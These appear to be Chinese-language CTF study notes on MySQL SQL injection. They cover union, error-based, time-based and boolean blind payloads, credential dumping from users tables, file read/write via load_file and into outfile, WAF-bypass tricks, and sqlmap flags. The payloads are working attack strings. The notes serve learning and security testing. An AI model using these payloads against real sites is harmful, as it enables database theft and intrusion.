---
title: 2-SQL注入
date: 2025-08-13 13:34:26
tags: [CTF, web, 马士兵]
---

## 第一章

### MySQL语法
union查询需要前后语句查询字段数量相同

order by字段名/数字

### MySQL系统库

information_schema库：信息数据库，保存关于MySQL服务器维护的所有其他水库的信息
- SCHEMATA表：提供当前MySQL实例中所有数据库信息
- TABLES表：提供关于数据中表的信息，table_name
- COLOMNS表：提供表的列信息，column_name

performance_schema库：数据库服务器性能参数

mysql库：核心数据库，存储数据库的用户（账户）信息

sys库：系统数据库，结合了information_schema和performance_schema库的内容

<!--more-->

## 第二章 MySQL手工注入

1. 检查输入过滤，判断有无注入点(and 1=1)
2. 猜解列名数量：order by
3. 通过报错方式判断回显点：union
4. 信息收集：
    version()数据库版本，database()数据库名称
    高版本：5.0+，系统库：information_schema, performance_schema, …
    低版本：5.0以下，没有系统库
5. 使用对应SQL进行注入
    information_schema.tables查找表名
    查询所有数据库名：
    `union select 1,group_concat(schema_name),3 from information_schema.schemata`
    查询security库下所有表名：
    `union select 1,table_name,3 from informaion_schema.tables where table_schema = ‘security’`
    ‘security’可替换为database()
    `group_concat(table_name)`数据合并分组
    查询表中字段：
    `union select 1,group_concat(column_name),3 from information_schema.columns where table_name=‘users’`
    字符可以转换成十六进制
    找到字段名后：
    `select username,password from users`
    `select group_concat(username,0x3a,password) from users`

### 高权限注入

多个网站共享MySQL服务器时，可以从高权限数据库注入到低权限数据库。

user()查看用户

mysql库中存在4个控制权限的表，user(最高权限), db(对数据库的权限), tables_priv(对表名的操作权限), columns_priv(对字段的操作权限)。

> mysql权限表的验证过程为：
> 先从user表中的Host,User,Password这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。

> 通过身份认证后，进行权限分配，按照user，db，tables_priv，columns_priv的顺序进行验证。即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。

> MySQL 权限级别分为： 
> 全局性的管理权限： 作用于整个MySQL实例级别 
> 数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上 
> 数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象上

> 权限存储在mysql库的user, db, tables_priv, columns_priv, and procs_priv这几个系统表中，待MySQL实例启动后就加载到内存中

![](/img/msb/17372058872557.png)

### 文件读写

前提条件：高权限

高版本MySQL添加了一个新的特性secure_file.priv, 限制了MySQL导出文件的权限。
```
# Linux
cat /etc/my.cnf
    [mysqld]
    secure_file.priv=

# Windows
my.ini
    [mysqld]
    secure_file.priv=
```
空：没有限制，NULL：不能进行读写，=d:/xxx/xxx：只能读写该目录下文件。

`show global variables like ‘%secure%’`查看MySQL全局变量的配置。

读文件函数`load_file()`，参数可以说单引号字符串，0x，char转换的字符，注意斜杠是/。
可以在union中作为一个字段使用，查看config.php, apache配置等。
可以使用相对路径。

Windows常见路径：
phpstudy:   phpstudy/www, phpstudy/PHPTutorial/www
Xampp:  xampp/htdocs
Wamp:   wamp/www
Appser: appser/www

Linux常见路径：
/var/mysql/data
/var/www/html

获取路径常见方式：报错显示，遗留文件，漏洞报错，平台配置文件等。

写入文件：函数`Into Outfile`（能写入多行，按格式输出），`into Dumpfile`（只能写入一行，没有输出格式）。
outfile不能接0x或char，只能是单引号路径。
```
union select 1,’abc’,3 into outfile ‘d:/1.txt —-+’
```

### 基础防御

#### 魔术引号

php.ini中magic_quotes_gpc = On/Off
(GET/POST/Cookie)

### 内置函数

is_int()
addslashes()
mysql_real_escape_string()
mysql_escape_string()

### 自定义关键字过滤

str_replace()

### 其他

其他安全防护软件如WAF等


## 第三章 数据类型与提交方式

类型转换：’1abc’和1

### 模糊查询

`select * from users where username like ‘%D%’`

### 数据提交方式

#### GET

url中传输数据，可利用联合注入方式直接注入。
一般用于数据不敏感时，安全性不高，长度有限制，速度很快

#### POST

直接传递给服务器。
一般用于表单的提交，如登录框。安全性高，长度不限，速度不快。

#### Cookie

`$c = $_COOKIE[‘s’];`
可以绕过一些常规防御手段

#### Request

可获取GET/POST参数。
`$uname = $_REQUEST[‘uname’];`

类似的超全局变量还有_SERVER。

## 第四章 查询方式和报错注入

### 查询方式

#### select查询数据
```
select * from where id=$id
```

#### delete删除数据
```
delete from user where id=$id
```

#### insert插入数据
```
insert into user (id,name,pass) values(1,’lihua’,’1234’)
```

#### update更新数据
```
update user set pwd=‘123’ where id=1
```

### 报错盲注

#### 基于报错的SQL盲注 - 报错回显（强制性报错）

updatexml(): 从目标XML中更改包含所查询值的字符串
updatexml(XML_document, XPath_string, new_value);

extractvalue(): 从目标XML中返回包含所查询值的字符串
extractvalue(XML_document, Xpath_string);

```
abc’ union select 1,extractvalue(1, concat(0x7e, (select version()), 0x7e))#
```

```
abc' union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 0,1),0x7e))#
```

注：limit 0,1: 从0开始取1个

```
abc' union select 1,updatexml(1,concat(0x7e,(select version()),0x7e),123)#
```

```
abc' or updatexml(1,concat(0x7e,(select version()),0x7e),123)#
```


```
abc' or updatexml(1,concat(0x7e,(select version()),0x7e),123) or’
```

### 延时盲注

```
select if(database()=‘test’,123,456);
```

```
id=1 and sleep(if(length(database()=8),5,0));
```

sleep():    休眠
if():   分支结构
mid(a,b,c): 从b开始，截取a字符串的c位
substr(a,b,c):  从b开始，截取a字符串的c个字符
left(a,b):  从左侧截取a的前b位
length():   长度
ord=ascii ascii(x)=100: 判断x的ascii值是否为100

```
sleep(if(mid(database(),1,1)=116,5,0);
```

### 布尔盲注

仅返回True或False时据此得到数据库中的信息。

```
1’ and ascii(mid(database(),1,1))>115
```

### 加解密注入

根据传输方式进行对应的加解密。

### 无列名注入

已知数据库，但不知道列名(information_schema被禁用)时，可以进行无列名注入。
```
select `3` from (select 1,2,3 union select * from users)a;

# 正常情况下反引号会被过滤
select b from (select 1,2 as b,3 union select * from users)a; # 查询第二列

select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from users)a limit 1,3    #同时查询多个列
```

### 堆叠注入

利用注入点执行下一条SQL语句，与union联合注入的区别在于可以用于执行任意语句。

## WAF绕过

WAF拦截原理：从规则库中匹配敏感字符进行拦截。
例：网站安全狗，宝塔，阿里云云盾

### 更改数据提交方式

没啥用

### 数据本身

更换大小写（没啥用）
内联注释：data/**/base()
双写绕过：ununionion
`/*!union select * from users*/`感叹号后面的内容会执行

同义词替换：
and &&
or  ||
= <、>
空格  %09, %0a, %0b, %0c, %0d, %20, %a0, (), /**/
注：%0a是换行，也可以指代空格

换行(\N)绕过
```
union #/*%0a select/*!1,2,3*/ —-+
union/*//—-/*/ /*!—-+/*%0aselect/*11,database(),3*/ —+
```

HTTP参污染：如果WAF没有对多参数进行多次过滤，则只会识别其中一个

![](/img/msb/17374514447604.png)

```
?id=1&id=-1%20union%20select%201,2,3%23*/
```

## sqlmap

- 基于布尔类型的盲注
- 基于时间的盲注
- 基于报错注入
- 联合查询注入
- 堆查询注入
- 带外注入

### GET型注入

-u  GET提交方式，跟注入的url网址

—-dbs   获取所有数据库
—-tables    获取所有数据表
—-columns   获取所有字段
—-dump  打印数据

-D  查询某个库
-T  查询某个表
-C  查询某个字段

—-level 高时测试范围更大
—-risk

### POST型注入

-r  加载文件
-p  指定参数
—-current-db    当前数据库
—-forms 自动检测表单

### UA注入和Refer注入

注意，存在POST请求时才会出现referer。